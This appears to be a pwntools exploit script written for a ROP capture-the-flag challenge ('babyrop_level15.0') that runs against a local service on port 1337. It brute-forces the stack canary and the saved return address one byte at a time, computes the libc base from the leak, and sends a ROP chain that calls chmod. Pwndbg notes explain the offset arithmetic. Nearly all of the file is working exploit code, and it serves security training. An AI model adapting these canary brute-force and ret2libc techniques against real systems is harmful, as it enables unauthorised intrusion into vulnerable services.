from pwn import *
import os
import glob
from time import sleep
from process_killer import kill_newest_process_by_name_no_library

def delete_core_files(directory="."):
    """
    Deletes files matching the pattern 'core.*' in the specified directory.

    Args:
        directory (str): The path to the directory to clean.
                         Defaults to the current working directory ('.').

    Returns:
        list: A list of paths to the files that were successfully deleted.
    """
    deleted_files = []
    # Construct the full path pattern for core files
    # os.path.join handles different operating system path separators
    core_file_pattern = os.path.join(directory, "core.*")

    print(f"Searching for files matching '{core_file_pattern}'...")

    # Use glob to find all files matching the pattern
    # glob.glob returns a list of paths matching the pattern
    files_to_delete = glob.glob(core_file_pattern)

    if not files_to_delete:
        print(f"No 'core.*' files found in '{directory}'.")
        return deleted_files

    print(f"Found {len(files_to_delete)} 'core.*' files to delete:")
    for file_path in files_to_delete:
        print(f"  - {file_path}")

    # Iterate through the found files and attempt to delete each one
    for file_path in files_to_delete:
        try:
            os.remove(file_path)
            print(f"Successfully deleted: {file_path}")
            deleted_files.append(file_path)
        except OSError as e:
            # Handle potential errors during deletion (e.g., permission denied, file in use)
            print(f"Error deleting {file_path}: {e}")
        except Exception as e:
            # Catch any other unexpected errors
            print(f"An unexpected error occurred while deleting {file_path}: {e}")

    print("Deletion process complete.")
    return deleted_files

# Stage - 1

bruteforced_canary = b""

while(len(bruteforced_canary) <= 8):
	for i in range(0x00, 0xff+1):
		p = remote("localhost", 1337)

		byte = int.to_bytes(i)

		payload = b""
		payload += b"A" * (120-16) # buffer
		payload += (bruteforced_canary + byte) # canary

		p.send(payload)

		res = p.recvall()

		p.close()

		if(b"stack smashing") not in res:
			print("------------- FOUND -------------")
			print("[+] Found a byte :: {}".format(byte))
			bruteforced_canary += byte
			print("[+] Canary Till Now :: {}".format(bruteforced_canary))
			print()
			continue
		else:
			print("[!] Trying byte {}".format(byte))
			print("[+] Canary Till Now :: {}".format(bruteforced_canary))

		delete_core_files()

print("[+] Leaked Canary :: {}".format(bruteforced_canary[0:8]))
print("[+] Actual Canary Value :: {}".format(hex(int.from_bytes(bruteforced_canary[0:8][::-1]))))

"""
# Use the following function to generate a list of bytes that correspondes to __libc_start_main+XX
# 0x00007fa5a2633c56 <+38>:    lea    rdi,[rsp+0x20]                                                                    
# 0x00007fa5a2633c5b <+43>:    call   0x7fa5a2649aa0 <__GI__setjmp>

def generate_byte_string_list_concise():
    #Generates a list of byte strings from b'\\x56\\x0c' to b'\\x56\\xfc'.
    return [b'\x56' + bytes([(i * 16) + 12]) for i in range(16)]

# Call the function to get the list
byte_list = generate_byte_string_list_concise()

# Print the list
print(byte_list)
"""

"""
# Mini - Stage - To Find 'x56xXc' that 'X' here those partial bytes restarts to main()
bruteforced_canary = p64(0xc999d454a232fd00)
saved_rip = b''
#arr = [b'-\x00', b'-\x10', b'- ', b'-0', b'-@', b'-P', b'-`', b'-p', b'-\x80', b'-\x90', b'-\xa0', b'-\xb0', b'-\xc0', b'-\xd0', b'-\xe0', b'-\xf0']
#arr = [b'V\x0c', b'V\x1c', b'V,', b'V<', b'VL', b'V\\', b'Vl', b'V|', b'V\x8c', b'V\x9c', b'V\xac', b'V\xbc', b'V\xcc', b'V\xdc', b'V\xec', b'V\xfc']

while(len(saved_rip) < 1):
	for i in range(0x00, 0xff+1):
		sleep(1)
		byte = int.to_bytes(i)

		payload = b""
		payload += b"A" * (120-16) # buffer
		payload += bruteforced_canary # canary
		payload += b"B" * 8 # saved_rbp
		payload += byte

		with remote("localhost", 1337) as p:
			p.send(payload)

			res = p.clean()
			print("----RESPONSE----")
			print()
			print(res)
			print()
			print("----RESPONSE----")

		if(b"### Welcome") in res:
			saved_rip += byte
			print("[+] Found Byte {}".format(byte))
			kill_newest_process_by_name_no_library("/challenge/babyrop_level15.0")
			break
		else:
			print("[!] Trying byte {}".format(byte))

		delete_core_files()

print("[+] Found Partial Overwrite Bytes :: {}".format(saved_rip[0:1]))
print("[+] Actual Partial Overwrite Bytes :: {}".format(hex(int.from_bytes(saved_rip[0:1][::-1]))))
"""

"""
# Stage - 2
bruteforced_canary = p64(0xc999d454a232fd00)
saved_rip = b'\x0e'

while(len(saved_rip) <= 8):
	for i in range(0x00, 0xff+1):
		sleep(1)
		byte = int.to_bytes(i)

		payload = b""
		payload += b"A" * (120-16) # buffer
		payload += bruteforced_canary # canary
		payload += b"B" * 8 # saved_rbp
		payload += (saved_rip + byte)

		with remote("localhost", 1337) as p:
			print()
			print()
			print("----START----")

			p.send(payload)

			res = p.clean()
			print("----RESPONSE----")
			print()
			print(res)
			print()
			print("----RESPONSE----")

		if(b"Welcome to") in res:
			print("------------- FOUND -------------")
			print("[+] Found a byte :: {}".format(byte))
			saved_rip += byte
			print("[+] saved_rip Till Now :: {}".format(saved_rip))
			print()
			kill_newest_process_by_name_no_library("/challenge/babyrop_level15.0")
			continue
		else:
			print("[!] Trying byte {}".format(byte))
			print("[+] saved_rip Till Now :: {}".format(saved_rip))

		delete_core_files()
		print("----END----")
		print()
		print()

print("[+] Leaked RIP :: {}".format(saved_rip[0:8]))
print("[+] Actual RIP Value :: {}".format(hex(int.from_bytes(saved_rip[0:8][::-1]))))
"""

"""
	[LEAKED RIP to LIBC BASE]

pwndbg> x/i 0x7e5104ad400e + 117
   0x7e5104ad4083 <__libc_start_main+243>:      mov    edi,eax
pwndbg> x/i 0x7e5104ad400e + 117 - 243
   0x7e5104ad3f90 <__libc_start_main>:  endbr64
pwndbg> x/i 0x7e5104ad400e + 117 - 243 + 0x23f90
   0x7e5104af7f20 <jrand48+16>: mov    rax,QWORD PTR ds:0x28
pwndbg> x/i 0x7e5104ad400e + 117 - 243 - 0x23f90
   0x7e5104ab0000:      jg     0x7e5104ab0047

Leaked Address = 0x7e5104ad400e, but remember we overwrote the last byte
Actual Address = 0x7e5104ad4083, difference between them = 117
So you add 117 to Leaked Address to get Actual Address (intended ret_addr)
Actual Address is at offset +243 from base address of __libc_start_main() func
You subtract 243 from actual address to obtain base address of __libc_start_main()
Finally, you do objdump -T ../libc | grep "__libc_start_main" to find out its offset
Then you subtract offset of __libc_start_main() to obtain base address of libc itself
"""

"""
# Stage - 3
bruteforced_canary = p64(0xc999d454a232fd00)
saved_rip = 0x7117a7d6600e

libc_base_addr = saved_rip + 117 - 243 - 0x23f90
# Check above for calculations

chmod_addr = libc_base_addr + 0x10dd80 # 0xff700 offset of chmod from libc
pop_rdi_ret = p64(libc_base_addr + 0x23b6a) # offset of rdi_ret is from libc
pop_rsi_ret = p64(libc_base_addr + 0x2601f) # offset of rsi_ret is from libc
filename = p64(libc_base_addr + 0x15ea3) # offset of "fchflags" str from libc
mode = p64(0x4)

payload = b""
payload += b"A" * (120-16) # buffer
payload += bruteforced_canary # canary
payload += b"B" * 8 # saved_rbp
payload += pop_rdi_ret
payload += filename
payload += pop_rsi_ret
payload += mode
payload += p64(chmod_addr)

p = remote("localhost", 1337)
p.send(payload)

print(p.clean())

p.close()
"""